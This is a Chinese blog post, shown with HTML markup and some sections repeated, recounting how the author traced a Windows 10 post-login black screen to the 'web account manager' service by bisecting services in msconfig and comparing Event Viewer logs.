字母开头的服务项排查时，登录终于黑屏了，虽然有些幸灾乐祸，但是却代表定位到问题了；然后就是继续二分，缩小范围，最终定位如下图所示：</p><p><img src="https://i.loli.net/2020/05/20/mZPgpqOarJB6sWu.png" alt="msconfig-uncheck-web-account.png"></p><p>也就是说罪魁祸首是这个名为“web 账户管理器”的服务项，看制造商应该是一项系统服务，并且之前搜索时看到有几位小伙伴定位的服务项是“App Readiness”，所以这个会因不同系统环境而不同，不应该一概而论冒然禁用；当然把它禁用后问题就<strong>解决</strong>了，没有像之前一样修改注册表，但是再次本着职业精神（no zuo no die），就继续分析一下问题的具体原因；</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><h4 id="日志概览"><a href="#日志概览" class="headerlink" title="日志概览"></a>日志概览</h4><p>每一次统计的系统日志就在这时候发挥作用了，因为每一次重启前都清除了日志，所以每次记录的也就是当前排查项的事件，下面看一下记录的日志情况：</p><p><img src="https://i.loli.net/2020/05/20/7qgA6YcxHBOaDLZ.png" alt="eventlog-app-apperr.png"></p><p><img src="https://i.loli.net/2020/05/20/PJanBDdlA4kv5ZE.png" alt="black-sys-errlog.png"></p><p>分别查看不同事件，可以 显示详细信息：</p><p><img src="https://i.loli.net/2020/05/20/CoM5NGHnkl8tgTi.png" alt="black-sys-err-dhcp.png"></p><p><img src="https://i.loli.net/2020/05/20/1tLIeDmEuXxSrbW.png" alt="black-sys-err-scm-ops.png"></p><h4 id="日志筛选"><a href="#日志筛选" class="headerlink" title="日志筛选"></a>日志筛选</h4><p>可以看到即使单次记录的日志量也是很庞大的，所以现在可以使用事件查看器的<strong>日志筛选</strong>功能了，即点击右侧操作栏的<strong>筛选当前日志</strong>按钮，会弹出筛选设置窗口：</p><p><img src="https://i.loli.net/2020/05/20/Whd6uxaFLikn57f.png" alt="eventlog-filter.png"></p><p>首先是记录时间，即指定事件的起始和结束时间点，可以在开机和桌面显示后分别记录一个时间，然后选择这个时间区间就能进一步缩小范围；</p><p><img src="https://i.loli.net/2020/05/20/DLo1dfYI8UyHezx.png" alt="eventlog-filter-time.png"></p><p>然后是时间组别，浏览也会发现事件主要分为信息、警告和错误，这里我们只用关心<strong>错误</strong>类型的事件，勾上后下面的项目暂时不用关，点确定；</p><p><img src="https://i.loli.net/2020/05/20/NkmrXzZR5lKGdpe.png" alt="eventlog-filter-config.png"></p><p>下面就是筛选结果，可以看到错误信息还挺多，</p><p><img src="https://i.loli.net/2020/05/20/vqGgIDwxbWpL6lT.png" alt="eventlog-filter-done.png"></p><p>对比黑屏时产生的错误日志，可以发现“应用程序”项的错误在正常进入桌面时也有发生，所以可以暂时排除这一项，而“安全”这一项，都是信息类，并没有错误类事件，所以也排除，最后就只剩“系统”这一项中的错误日志存在差异，存在差异的事件包括名为 <code>Service Control Manager</code> 和 <code>DistributedCOM</code>  的事件“来源”中；</p><p><img src="https://i.loli.net/2020/05/20/41OykxKat78FhLi.png" alt="eventlog-app-err-of-black.png"></p><p><img src="https://i.loli.net/2020/05/20/1Lkr5Uwgcjodvl3.png" alt="eventlog-sys-err-of-black.png"></p><h4 id="对比分析"><a href="#对比分析" class="headerlink" title="对比分析"></a>对比分析</h4><p>那么我们就来对比一下“系统”中产生的错误日志的差异，只是事件查看器似乎没有内置日志对比的功能，所以只能使用较为原始的办法，先选中想要分析的事件：</p><p><img src="https://i.loli.net/2020/05/20/oBW3fsAN7KrJZO4.png" alt="eventlog-select-event.png"></p><p>再点击右侧的<strong>保存选择的事件</strong>按钮，保存事件日志文件到任意位置：</p><p><img src="https://i.loli.net/2020/05/20/7kif9mCnGgQD2NX.png" alt="eventlog-save-selected-log.png"></p><p>像这样分别记录和保存发生黑屏问题和未发生问题时的事件，然后点击“打开保存的日志”，就能导入两个日志文件就行下一步分析了：</p><p><img src="https://i.loli.net/2020/05/20/NzOyr49GwTdnQvg.png" alt="eventlog-open-saved-log.png"></p><p>另外发现每个事件似乎都对应着一个唯一的 <strong>事件 ID</strong> 值，可以通过这个把两个日志文件重复的地方剔除，这就要使用筛选功能里的事件 ID 排除选项了：</p><p><img src="https://i.loli.net/2020/05/20/e7Crcf4RqUGz6i1.jpg" alt="Inkedeventlog-filter-exclude-id.png"></p><p>填入重复的事件 ID，用逗号隔开，前面加负号 <code>-</code> 表示排除该 ID 的事件，不加表示包括，筛选结果如下：</p><p><img src="https://i.loli.net/2020/05/20/s4mTkPF37lWdDEL.png" alt="eventlog-filter-compare-result.png"></p><p>两个错误事件相同，从下方信息栏中没有发现特别有用的信息，只有一行主要信息：</p><pre class="line-numbers language-none"><code class="language-none">服务器 &#123;784E29F4-5EBE-4279-9948-1E8FE941646D&#125; 没有在要求的超时时间内向 DCOM 注册。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么接下来分析一下这串注册值，<code>Win+R</code> 输入 <code>wmic</code> 运行，进入 <strong>wmic</strong> 管理界面，然后运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dcomapp where <span class="token string">"appid&lt;='&#123;79' and appid>='&#123;74'"</span> get appid,name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上命令是查询开头类似 <code>&#123;784E29F4-5EBE-4279-9948-1E8FE941646D&#125;</code> 的 DCOM 服务，得到结果如下：</p><p><img src="https://i.loli.net/2020/05/20/3IOJitc1AXCrnRk.png" alt="wmic-dcomapp-query.png"></p><p>浏览后发现里面没有和上面相同的 ID 值，所以这条线索断了，试试其它的；</p><h4 id="进程追踪"><a href="#进程追踪" class="headerlink" title="进程追踪"></a>进程追踪</h4><p>点一下“详细信息”，再向下浏览，发现了触发该事件的进程信息，其中比较重要的就是进程 ID（ProcessID），也就是常说的 PID，这里为 <code>1140</code>，先记下来；</p><p><img src="https://i.loli.net/2020/05/20/Ek7Or2Ui3MwvhNL.png" alt="eventlog-sys-compared-err-pid.png"></p><p>然后 <code>Ctrl+Shift+Esc</code> 打开任务管理器，点一下 <strong>PID</strong> 栏（没有就在表头右键单击，然后勾选上），让它按数字升序排列，找到之前记录的 pid 值（1140）：</p><p><img src="https://i.loli.net/2020/05/20/mCSs7kdBhu2xXOD.png" alt="eventlog-err-pid-with-tasklist.png"></p><p>这时就能看到运行该进程的命令行信息了（同样要是没有这一列就右键点击勾选），发现运行的程序是 <code>C:\Windows\system32\svchost.exe</code>，这是一个系统程序，很多服务都会调用它，需要关注的是后面的参数，出现了 <code>RPCSS</code> 这个关键字，看着很熟悉，好像是和远程相关的，搜索后网上说这是一个与 <code>135</code> 端口相关的服务，那么我们就 <code>Win+R</code> 输入 <code>cmd</code> 打开命令提示符，查看一下这个端口信息：</p><p><img src="https://i.loli.net/2020/05/20/a4Fj1Jzonr3c5fN.png" alt="cmd-netstat-rpcss.png"></p><p>果然存在关联，那么这个 <code>RPCSS</code> 应该是一个服务，所以接下来用 <code>sc</code> 命令查询一下这个服务：</p><p><img src="https://i.loli.net/2020/05/20/kPT8q6sgMxtSjwC.png" alt="cmd-sc-rpcss.png"></p><p>确实是一个服务，这里主要是获取 <code>DISPLAY_NAME</code> 这个值，即 <code>Remote Procedure Call</code>，然后打开服务管理工具（<code>Win+R</code> 后输入 <code>services.msc</code>），找到这个服务项：</p><p><img src="https://i.loli.net/2020/05/20/ZdMJRHNU1QyuG38.png" alt="service-rpcss.png"></p><p>双击进去，看一下依赖关系，确实是一项系统基础服务，许多重要的服务和模块都依赖于它，还不能直接冒然禁用：</p><p><img src="https://i.loli.net/2020/05/20/fgk4eRA3tKdjvZp.png" alt="service-rpcss-depend.png"></p><p>到这里所有分析工作就结束了。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>下面是之后重新收集的黑屏时的错误事件（启用全部服务），这次就只剩一处错误日志了，也与上面分析筛选结果一致：</p><p><img src="https://i.loli.net/2020/05/20/uTV34l8KHfGkJOc.png" alt="eventlog-in-black-less-err-warn.png"></p><p>然而，当再次禁用之前的问题服务项时，信息量就剧增了：</p><p><img src="https://i.loli.net/2020/05/20/qPZIgbeGtcEQnay.png" alt="eventlog-no-black-more-err-warn.png"></p><p>原因也很明显，禁用一项比较关键的服务项，并且其依赖项还比较多时，就难免发生连环事故，虽然暂时解决了目前的问题，但是对于轻微强迫症的作者来说，多少看着还是有些不安（饮鸩止渴？）但是后面有趣的事情又发生了，在某一次启用全部服务（包括之前确定为问题源的“web 账户管理器”服务）重启进入系统后，竟然意外地<strong>没有黑屏</strong>，而是和平时一样正常进入桌面，后面又试了几次都正常……难道是这一天的 n 顿操作猛如虎和无数次重启再次感化 CPU？看来 Windows 系统永远是个谜，bug 轻轻走了又正如它轻轻的来，不带走一片云彩，算了不玩了，收工。<br>–&gt;</p><h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>一阳光明媚的晌午，本人心情愉悦地翻开笔记本，一如既往地摁下开机键后，略过了主板开机动画，熬过了 Windows 登录（win10 系统）的魔力转圈圈，最终却没能等来那昔日熟悉的桌面与亲切的图标们，直接映入眼帘的是下图：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMTkvOFlrZ0ZoY3MzSXpsU0tiLnBuZw?x-oss-process=image/format,png" alt="black.png"></p><p>嗯，就这样盯着它，10s…30s…1min…时间安静的流淌，内心也慢慢掀起了波澜，身经百战的心灵意识到不好的事情要发生了；Nice，人在家中坐，bug 天上来，不过黑屏给了我黑色的眼，我将用它来寻找问题。</p><h1 id="问题探索"><a href="#问题探索" class="headerlink" title="问题探索"></a>问题探索</h1><p>首先，调整好心态，冷静就有希望，慌乱就会败北（或者是像本人一样曾被无数 bug 折磨后的生死看淡？）问题总有会一些办法可以进行解决；然后就是寻找突破口了，这时下意识的晃了晃鼠标，然后熟悉的小光标出现了！但是还是背景一片黑，不过在这无边的黑暗中，这光标也算闪烁着唯一又弱小的希望的光芒；然后又是试探性的按了一下键盘的 <code>windows</code> 键，然后画风一变：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMTkvWXpoZUJPS01YNnJvWkx4LnBuZw?x-oss-process=image/format,png" alt="black-win-a.png"></p><p>按 <code>win+a</code>也有反应，打开了侧边栏，证明系统已经加载完毕，按键都有作用，只是无法显示，于是一顿操作打开了个应用（盲开），等待数秒后没有反应，仍是一片黑，再次按下 win 键又确实看见了它已被打开，鼠标挪到任务栏位置看一下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMTkvcWo5aXpUMnhkOFhTTEphLnBuZw?x-oss-process=image/format,png" alt="black-mouse-to-taskbar-window.png"></p><p>再开个应用，尝试使用 <code>alt+tab</code> 组合键切换应用：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMTkvUGRCOGJUYVJNM0w0SURmLnBuZw?x-oss-process=image/format,png" alt="black-switch-window.png"></p><p>看来能够正常启动应用，然后尝试点开了任务栏一个应用（资源管理器），把鼠标挪到应用的任务栏缩略图后，出现了下面一幕：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMTkvcWo5aXpUMnhkOFhTTEphLnBuZw?x-oss-process=image/format,png" alt="black-mouse-to-taskbar-window.png"></p><p>咦这不是我那亲切的桌面嘛，居然以这种方式出现了，果然有戏，接下来再进一步发掘；<strong>然而</strong> 就在这时，桌面奇迹般的亮了，一切恢复如初，就像风不曾吹过，雨不曾下过，似一切都未曾发生过，难道是这般执著感化了 CPU ？开个玩笑，刚才没有执行特使的操作，应该是某种超时时间过了，桌面出现响应，不过看了看时间，算一下时间差大概有 3 分钟左右，果然这就是神奇的相对论，转瞬的时间有时可以变得很漫长；</p><p>不过事情不会这样结束，接下来又是习惯性地重启了电脑，看一下问题是否会再现，一顿操作和等待后，电脑开机…登录…转圈圈…然后果然又是黑屏！无边的黑暗再次席卷覆盖整个显示屏，不过这一次就要想办法将其撕破了；</p><h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p>根据前面的经历，这里黑屏应该也要持续 3 分钟左右，甚至更多，那么就不能干等着，于是开始盯着深邃的屏幕陷入沉思：问题出在 Windows 系统登录后（该系统设置了开机自动登录 Windows 账户），就是系统的 BOOT 引导已经结束，这样就排除了常见的开机黑屏现象，即按下 电源键后一直黑没多余反应那种，这就通常是硬件方面的问题，比如内存条接触不良等原因，目前就基本排除了这些原因；既然是系统启动后，并且执行完了登录操作，而没能正常显示桌面，那么问题就缩小（好像也不怎么小哈..）到了软件层面，比如系统服务，驱动，启动项等等；</p><p>等等，启动项和桌面，好像想到了什么，因为一直在用一款桌面整理软件，从而避免脏乱差的视觉环境，同时就是设置开机启动，最近软件也更新了一下，难道是这个原因造成的桌面显示 bug ？不知不觉间桌面已经恢复显示了，于是按下 <code>Ctrl+Shift+Esc</code> 组合键调出任务管理器，点下 <strong>启动</strong> 栏，然后禁用该程序开机启动：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMTkvQzZ6YlFFd1ZHVGh0dktNLnBuZw?x-oss-process=image/format,png" alt="taskmgr-startup-disable.png"></p><p>随后马不停蹄地重启了电脑，然后，事实证明事情似乎没有想象中的简单，依然是熟悉的黑屏，到这里也没有特别的好招了，因为一般给别人解决问题时首先就是问最近干了啥，可能会发现线索，不过本人最近用计算机干的事情似乎有点多，系统到用户层面的各种，服务器、虚拟机、数据库等等，一时也想不出什么线索（甚至觉得盯着屏幕呼吸都是一种错 -_-），所以准备向搜索引擎寻求帮助或者找找启发；</p><h1 id="问题排查"><a href="#问题排查" class="headerlink" title="问题排查"></a>问题排查</h1><h2 id="搜索解决方案"><a href="#搜索解决方案" class="headerlink" title="搜索解决方案"></a>搜索解决方案</h2><p>一搜还确实有不少小伙伴有类似的经历，排除硬件故障无法开机的，有说更新驱动的，还不少，这种回答就一笑略过吧，这种方案很普遍也是有原因的，排除不愿相信硬件损坏的显示，就可以把大部分问题推到在软硬件之间打交道的驱动程序上了，其在过去确实能解决大部分问题，不过各厂商也都更新了这么多年了，驱动层面的问题现在应该很少了，而且本人电脑里的各个驱动都一直保持在最新状态，这个也排除了；</p><p>另外也有提到取消 Windows 的快速启动功能的，也就是下面的步骤：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMTkvTGszMVVEZUpNWnVLbG01LnBuZw?x-oss-process=image/format,png" alt="control-powercfg.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMTkvbWkxSDVBOWpoc3dMazZaLnBuZw?x-oss-process=image/format,png" alt="control-power-unlock.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMTkvQjE4QWlDcllTbzlFbHluLnBuZw?x-oss-process=image/format,png" alt="control-power-uncheck.png"></p><p>不过经测试无效，所以排除；</p><p>继续浏览，不出所料，处理和解决 Windows 大部分故障或问题的场景，几乎都能见到 <strong>注册表</strong> 的身影，不过确实注册表这东西和 Windows 系统关系相当紧密，你在 Windows 中执行的大部分可见甚至不可见的操作，几乎都一项注册表项值与之关联；关于注册表的解决方案中基本都提到修改同一个地方（大部分是让下载或者新建一个注册表文件，然后双击导入系统，其实大可不必这样复杂）：</p><pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&#123;4d36e968-e325-11ce-bfc1-08002be10318&#125;\0000HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\&#123;4d36e968-e325-11ce-bfc1-08002be10318&#125;\0001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>即在这两项下都增加（不存在的话）一个名为 <code>EnableULPS</code> 的键，值为 <code>0</code>，类型为 <code>REG_DWORD</code>，就是如下图这样：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMTkvQ1E3aE9zS3Z6bmxJZEhhLnBuZw?x-oss-process=image/format,png" alt="regedit-enableULPS.png"></p><p>不明觉厉，先重启试试……还真<strong>解决</strong>了！！但是由于职业精神，问题被莫名其妙的解决了还是有些不甘心，于是就继续深入分析下，上面的注册表操作其实就是把 <code>EnableULPS</code> 这个熟悉赋值为了 <code>0</code>，根据字面意思全部翻译过来就是禁用了 <code>ULPS</code> 这个功能，再搜索得知，其全称 <code>Ultra Low Power State（超低功率状态）</code>，这个似乎是 AMD 中的一个功能，下面是引用片段：</p><blockquote><p> AMD 显卡为了防止因为频率太高导致系统不稳定。所以在 AMD 显卡上推出了一个 ULPS 功能，就是用户无操作的时候自动降频，休眠，然后用于节电。想法是好的，但是有人用了导致黑屏。所以出了一个关闭此功能的工具，它可以用于检测这个功能的开关状态，并直接关掉。</p></blockquote><p>不过这个问题能在我的 Intel 中出现也是很迷；另外文章还有提到：</p><blockquote><ul><li>ULPS是休眠状态 ，降低非主卡的频率和电压的以节省电能，缺点就是可能会导致性能的损失和一些交火不稳定。</li><li>经常用电池的不建议关闭ULPS，因为关闭后显卡一直工作在独显状态。</li></ul></blockquote><p>细想以前似乎从未动过这个功能，这么冒然改好像有点简单粗暴，之后还可能会得不偿失，所以这个方案暂时存着，先找找其它方面的问题；</p><h2 id="自行排查-1"><a href="#自行排查-1" class="headerlink" title="自行排查"></a>自行排查</h2><h3 id="系统服务-1"><a href="#系统服务-1" class="headerlink" title="系统服务"></a>系统服务</h3><p>就像之前说的，搜索问题有时候并不能得到有效的解决方案，但是某些回复的解决手段或者思路是可以起到一定程度的启发作用的，比如某一条大致说的是排查系统服务的问题，确实，之前分析时把问题定位在系统层面，排查过了启动项，但是 <strong>服务</strong> 这一块还没测试，所以先打开 <code>msconfig</code>，<code>Win+R</code> 后输入：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAveWVjOE9uUGZvd2dSYXFGLnBuZw?x-oss-process=image/format,png" alt="msconfig-open.png"></p><p>然后进入服务模块：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvS2dQNXlackc0QVlvYWJRLnBuZw?x-oss-process=image/format,png" alt="msconfig-service.png"></p><p>这里列出的就是系统中的所有服务项，前面打勾代表已启用，否则是禁用，这里的思路就是先都禁用了，然后重启如果正常则挨个启用排查是哪一项服务的问题，当然这样工作量有点大，全部禁用也可能会出现额外的问题，所以可以先试试系统自带的诊断启动，会加载一些基本服务和设备，就是点击上图顶部最左侧的 <strong>常规</strong> 模块，然后选择 <strong>诊断启动</strong>：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvTDNJbFoyZEpNeFJCdWJOLnBuZw?x-oss-process=image/format,png" alt="msconfig-diagnose-boot.png"></p><p>点确定或应用后重启系统，这次就愉快又快速的进入系统桌面了（证明禁用不必要的服务确实能提高开机速度），不过也会发现某些模块无法使用，比如喇叭和屏幕亮度，甚至提示某些系统错误，很正常，因为只启用了基本服务，其它的系统服务和模块就没有加载，不过不影响问题排查就行了；</p><h3 id="系统日志-1"><a href="#系统日志-1" class="headerlink" title="系统日志"></a>系统日志</h3><p>当然，排查问题怎么少的了日志分析，可以起到一定辅助作用，于是这时就想起了 Windows 自家的法宝 <strong>事件查看器</strong>（由于平时也基本也怎么用过），平时用惯了 Linux 命令行分析日志，突然一切可视化了还不太习惯，先打开熟悉一下操作再说：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvcmNrWjhMTVJBN1lPNnQ5LnBuZw?x-oss-process=image/format,png" alt="event-win-search.png"></p><p>点开 Windows 日志：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvVk5pN2VXc0RnZEU4NEdBLnBuZw?x-oss-process=image/format,png" alt="eventlog-windows-log.png"></p><p>再看看包含事件的几项：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvbFlGelZEZEo2MkNIQnZqLnBuZw?x-oss-process=image/format,png" alt="eventlog-app.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvS1dUWFBhejUxUzdwaWNELnBuZw?x-oss-process=image/format,png" alt="eventlog-security.png"></p><p>这里由于分析问题可能是出在系统层面上，所以先关注 Windows 相关的事件，应用程序的暂且不管（其实也是因为点开它后发现应用数量有些庞大，不好找落脚点 ╮(╯▽╰)╭<br>），然后就是挨个进到每一项中，点击右侧操作栏的<strong>清除日志</strong>按钮把日志分别清空：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvZTJUcU0zcklvaWNnWlJ4LnBuZw?x-oss-process=image/format,png" alt="eventlog-clear.png"></p><p>这样如果后续操作时问题复现了，就可以较精确的定位了；</p><h3 id="服务排查-1"><a href="#服务排查-1" class="headerlink" title="服务排查"></a>服务排查</h3><p>然后可以把事件查看器关闭，再次打开 <code>msconfig</code>，选择诊断启动，再切到服务模块，可以看到大部分服务都没有被勾选了，然后我们点一下“服务”这个表头，让项目按名称顺序排列，方便后续操作：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvSFo4VU55RDk1aTZRUm9yLnBuZw?x-oss-process=image/format,png" alt="msconfig-sort-by-name.png"></p><p>然后就是重点的排除环节了，这里大致数了一下，有 400 个左右的服务项，如果挨个勾选再重启检查的话，可能也就写不出这篇文章了，所以需要找一个高效的办法，之前搜索问题时也受到一位小伙伴的启发，可以使用 <strong>二分查找</strong> 法进行排除，这本来是算法中的一种解决方案，没想到被这样给实际应用了(～￣▽￣)～，这里通俗讲就是先勾选一半的服务项目，比如从第一条开始，一直勾选直到右侧滚动条运动到大概中点的位置（好像工作量也不小，看手速咯），前面已经对服务名称进行过排序，所以这里前半部分服务大致是字母开头是 <code>A - P</code> 的服务项：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvTnhJaERzVXlwYzMxTGJFLnBuZw?x-oss-process=image/format,png" alt="msconfig-check-a-p.png"></p><p>重启系统后正常进入桌面，证明问题不在勾选的前半部分服务项中，可以排除掉，接下来我们再把剩下的没有勾选的服务项，勾选它们的前半部分，也就是说现在还有总量的最后四分之一部分没有被勾选，这样排除确实挺快，然后就是清除全部 Windows 日志，重启，再重复这些工作，直到问题复现（登录黑屏）；</p><p>于是乎在进行到 <code>W</code> 字母开头的服务项排查时，登录终于黑屏了，虽然有些幸灾乐祸，但是却代表定位到问题了；然后就是继续二分，缩小范围，最终定位如下图所示：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvbVpQZ3BxT2FySkI2c1d1LnBuZw?x-oss-process=image/format,png" alt="msconfig-uncheck-web-account.png"></p><p>也就是说罪魁祸首是这个名为“web 账户管理器”的服务项，看制造商应该是一项系统服务，并且之前搜索时看到有几位小伙伴定位的服务项是“App Readiness”，所以这个会因不同系统环境而不同，不应该一概而论冒然禁用；当然把它禁用后问题就<strong>解决</strong>了，没有像之前一样修改注册表，但是再次本着职业精神（no zuo no die），就继续分析一下问题的具体原因；</p><h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h3><h4 id="日志概览-1"><a href="#日志概览-1" class="headerlink" title="日志概览"></a>日志概览</h4><p>每一次统计的系统日志就在这时候发挥作用了，因为每一次重启前都清除了日志，所以每次记录的也就是当前排查项的事件，下面看一下记录的日志情况：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvN3FnQTZZY3hIQk9hRExaLnBuZw?x-oss-process=image/format,png" alt="eventlog-app-apperr.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvUEphbkJEZGxBNGt2NVpFLnBuZw?x-oss-process=image/format,png" alt="black-sys-errlog.png"></p><p>分别查看不同事件，可以 显示详细信息：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvQ29NNU5HSG5rbDh0Z1RpLnBuZw?x-oss-process=image/format,png" alt="black-sys-err-dhcp.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvMXRMSWVEbUV1WHhTcmJXLnBuZw?x-oss-process=image/format,png" alt="black-sys-err-scm-ops.png"></p><h4 id="日志筛选-1"><a href="#日志筛选-1" class="headerlink" title="日志筛选"></a>日志筛选</h4><p>可以看到即使单次记录的日志量也是很庞大的，所以现在可以使用事件查看器的<strong>日志筛选</strong>功能了，即点击右侧操作栏的<strong>筛选当前日志</strong>按钮，会弹出筛选设置窗口：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvV2hkNnV4YUZMaWtuNTdmLnBuZw?x-oss-process=image/format,png" alt="eventlog-filter.png"></p><p>首先是记录时间，即指定事件的起始和结束时间点，可以在开机和桌面显示后分别记录一个时间，然后选择这个时间区间就能进一步缩小范围；</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvRExvMWRmWUk4VXlIZXp4LnBuZw?x-oss-process=image/format,png" alt="eventlog-filter-time.png"></p><p>然后是时间组别，浏览也会发现事件主要分为信息、警告和错误，这里我们只用关心<strong>错误</strong>类型的事件，勾上后下面的项目暂时不用关，点确定；</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvTmttclh6WlI1bEtHZHBlLnBuZw?x-oss-process=image/format,png" alt="eventlog-filter-config.png"></p><p>下面就是筛选结果，可以看到错误信息还挺多，</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvdnFHZ0lEd3hiV3BMNmxULnBuZw?x-oss-process=image/format,png" alt="eventlog-filter-done.png"></p><p>对比黑屏时产生的错误日志，可以发现“应用程序”项的错误在正常进入桌面时也有发生，所以可以暂时排除这一项，而“安全”这一项，都是信息类，并没有错误类事件，所以也排除，最后就只剩“系统”这一项中的错误日志存在差异，存在差异的事件包括名为 <code>Service Control Manager</code> 和 <code>DistributedCOM</code>  的事件“来源”中；</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvNDFPeWt4S2F0NzhGaExpLnBuZw?x-oss-process=image/format,png" alt="eventlog-app-err-of-black.png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvMUxrcjVVd2djam9kdmwzLnBuZw?x-oss-process=image/format,png" alt="eventlog-sys-err-of-black.png"></p><h4 id="对比分析-1"><a href="#对比分析-1" class="headerlink" title="对比分析"></a>对比分析</h4><p>那么我们就来对比一下“系统”中产生的错误日志的差异，只是事件查看器似乎没有内置日志对比的功能，所以只能使用较为原始的办法，先选中想要分析的事件：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvb0JXM2ZzQU43S3JKWk80LnBuZw?x-oss-process=image/format,png" alt="eventlog-select-event.png"></p><p>再点击右侧的<strong>保存选择的事件</strong>按钮，保存事件日志文件到任意位置：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvN2tpZjltQ25HZ1FEMk5YLnBuZw?x-oss-process=image/format,png" alt="eventlog-save-selected-log.png"></p><p>像这样分别记录和保存发生黑屏问题和未发生问题时的事件，然后点击“打开保存的日志”，就能导入两个日志文件就行下一步分析了：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvTnpPeXI0OUd3VGRuUXZnLnBuZw?x-oss-process=image/format,png" alt="eventlog-open-saved-log.png"></p><p>另外发现每个事件似乎都对应着一个唯一的 <strong>事件 ID</strong> 值，可以通过这个把两个日志文件重复的地方剔除，这就要使用筛选功能里的事件 ID 排除选项了：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvZTdDcmNmNFJxVUd6NmkxLmpwZw?x-oss-process=image/format,png" alt="Inkedeventlog-filter-exclude-id.png"></p><p>填入重复的事件 ID，用逗号隔开，前面加负号 <code>-</code> 表示排除该 ID 的事件，不加表示包括，筛选结果如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDUvMjAvczRtVGtQRjM3bFdkREVMLnBuZw?x-oss-process=image/format,png" alt="eventlog-filter-compare-result.png"></p><p>两个错误事件相同，从下方信息栏中没有发现特别有用的信息，只有一行主要信息：</p><pre class="line-numbers language-none"><code class="language-none">服务器 